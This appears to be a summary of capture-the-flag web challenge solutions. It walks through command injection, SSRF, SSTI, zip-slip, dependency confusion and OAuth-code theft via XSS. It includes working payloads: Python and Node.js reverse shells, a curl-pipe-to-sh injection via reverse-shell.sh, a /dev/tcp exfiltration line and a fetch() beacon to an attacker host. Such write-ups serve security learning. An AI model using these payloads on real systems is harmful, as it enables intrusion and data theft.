# Summary
-----------

## Swaggy (Easy 50pts)
1. There's a list of available APIs.
2. Use `Authorization` header with creds admin:admin

## Confidentiality (Easy 50pts)
1. Command injection, `| cat flag.txt`

## Titanic (Easy 50pts)
1. URLCapture to http://localhost/server-status
2. Get credential of `root`
3. Log in

## Integrity (Medium 50pts)
1. Command Injection, `%0acat flag.txt`

## All Baked Up (Medium 359pts)
1. GraphQL Injection
2. Get a credential for authorized user
3. Use mutation for authenticating user
4. Use token and querying flag

## OPA Secrets (Hard 298pts)
(**Unintended**)
1. Download Source code at `/security`
2. Create a secret and view it
3. Change it to id flag note

(**Intended**, from problem setter itself **@congon4tor**)

1. Create a new user.
2. Create a new secret.
3. Go to "View permissions" and inspect the values in the select to get your user's id
4. Use the SSRF in the settings page. Override the method by duplicating --request to send a post adding your user write permissions to the flag secret

```
curl 'http://<host>:<port>/updateSettings' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=<your-session-token>' \
  --data-raw 'url=--request+POST+http%3A%2F%2Flocalhost%3A8181%2Fv1%2Fdata%2Faccess%2Fwrite+--data-raw+%27%7B%22input%22%3A%7B%22user%22%3A%22<your-id>%22%2C%22secret%22%3A%22afce78a8-23d6-4f07-81f2-47c96ddb10cf%22%7D%7D%27'
```

5. Now get the value of the secret

```
curl 'http://<host>:<port>/getValue' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=<your-session-token>' \
  --data-raw '{"id":"afce78a8-23d6-4f07-81f2-47c96ddb10cf"}'
```

## Availability (Hard 357pts)
1. Command Injection, `%0acat flag.txt > /dev/tcp/ip_addr/port`

## Unpugify (Hard 480pts)
1. Application using pug and pug-code-gen, it has a critical security issue

template
```
html
  head
  body
    mixin print(text)
      p= text

    +print('Hello, world')
```
pretty
```
');process.mainModule.constructor._load('child_process').exec('curl https://reverse-shell.sh/ip_addr:port | sh');_=('
```

## Bumblebee (Hard 491pts)
1. Debug mode is enable
2. Send array in parameter to trigger error handling and leak snippet code
3. Zip file must have `.flower` extension
4. Django version is vulnerable with zip-slip
5. Replace `/usr/src/app/manage.py` using zip-slip then refresh

manage.py
```
#!/usr/bin/env python
import os
import sys
import socket,subprocess,os

if __name__ == '__main__':
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("ip_addr",port))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])

    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'bumblebee.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)
```

## Spiral CI (Hard 496pts) ([Detailed Writeup](Web/SpiralCI))
1. Application accepting JWT `none` algorithm
2. Tampering `user_id` to `2`
3. Calculator Project using local dependency
4. Vulnerable to dependency confusion

calc.test.js
```
var net = require('net');
var spawn = require('child_process').spawn;
HOST="ip_addr";
PORT="port";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { 
    String.prototype.contains = function(it) { 
        return this.indexOf(it) != -1; 
    }; 
}
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit', function(code,signal){
            client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
```

## Sticky Notes (Hard 500pts) ([Detailed Writeup](Web/Sticky%20Notes))
1. The flow of oauth login for this application is something like this
`sticky-notes/oauth/signin -> oaut/oauth/authorize?state=nyx -> sticky-notes/signin_callback?code=steal&state=nyx`
2. Sticky notes application have XSS in `report a problem`
3. Steal `code` using `iframe`
4. Set `iframe` to oauth application using valid `state` and default value `redirect_url`
5. The oauth application will redirecting to sticky notes with `code` parameter
6. Send the current url to our webhook using js

payload
```
<iframe src="http://challenge.ctf.games:30783/oauth/authorize?response_type=code&client_id=QJ7Bo88ZBioNTZSXTOJrMYDx&redirect_uri=http%3A%2F%2Fchallenge.ctf.games%3A30846%2Foauth%2Fsignin_callback&scope=profile&state=Kjq4dAo18GjizCdF4sYxxO9GVFMddx&action=signin">
</iframe>
<script>
document.querySelector('iframe').addEventListener("load", function(){
    fetch('//ip_addr:port/?'+btoa(this.contentWindow.location.href))
})
</script>
```

## Go Blog (Hard 500pts) ([Detailed Writeup](Web/GoBlog))
1. `url/models/` and `url/web/` leaking source code
2. Username parameter have SSTI
3. `{{.}}` get credentials of admin but password is encrypted in sha512
3. Set username to `{{.CurrentUser.ChangePassword 'nyx'}}` and visit `/profile` will change our account password to `nyx`.
4. Set username to `{{.Post.Author.ChangePassword 'nyx'}}` and visit `/post/{post_uuid_admin}` will change the password the author of post to `nyx`
5. Change password of admin, logged in and visit `/admin`
